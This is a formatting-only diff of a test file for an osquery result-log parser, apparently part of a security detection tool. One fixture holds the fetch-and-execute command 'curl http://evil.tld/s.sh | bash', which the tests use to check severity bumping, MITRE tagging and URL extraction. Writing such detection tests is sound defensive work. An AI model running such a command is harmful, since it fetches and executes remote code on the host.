@@ -36,9 +36,13 @@ describe("parseOsqueryLog — result-log mapping", () => {
   });
 
   it("bumps a row whose cmdline column matches attacker tradecraft (curl|bash fetch-execute)", () => {
-    const r = parseOsqueryLog(ndjson(line({
-      columns: { pid: "9", path: "/bin/bash", cmdline: "curl http://evil.tld/s.sh | bash", uid: "0" },
-    })));
+    const r = parseOsqueryLog(
+      ndjson(
+        line({
+          columns: { pid: "9", path: "/bin/bash", cmdline: "curl http://evil.tld/s.sh | bash", uid: "0" },
+        }),
+      ),
+    );
     expect(["Medium", "High"]).toContain(r.events[0].severity);
     expect(r.events[0].mitreTechniques).toContain("T1059.004");
     // the fetch URL is scraped from the command line
@@ -48,7 +52,9 @@ describe("parseOsqueryLog — result-log mapping", () => {
   it("expands a snapshot into one event per row and extracts a hash IOC", () => {
     const snap = {
       name: "pack/osquery-monitoring/processes",
-      hostIdentifier: "host2", unixTime: 1722513600, action: "snapshot",
+      hostIdentifier: "host2",
+      unixTime: 1722513600,
+      action: "snapshot",
       snapshot: [
         { pid: "1", name: "systemd", path: "/usr/lib/systemd/systemd" },
         { pid: "2", name: "curl", path: "/usr/bin/curl", sha256: "a".repeat(64) },
@@ -69,7 +75,13 @@ describe("detectImportKind — routes osquery result logs", () => {
     expect(detectImportKind("osqueryd.results.log", ndjson(line({})))).toBe("osquery");
   });
   it("detects an osquery snapshot line as osquery", () => {
-    const snap = { name: "q", hostIdentifier: "h", unixTime: 1722513600, action: "snapshot", snapshot: [{ a: "1" }] };
+    const snap = {
+      name: "q",
+      hostIdentifier: "h",
+      unixTime: 1722513600,
+      action: "snapshot",
+      snapshot: [{ a: "1" }],
+    };
     expect(detectImportKind("snap.log", ndjson(snap))).toBe("osquery");
   });
 });
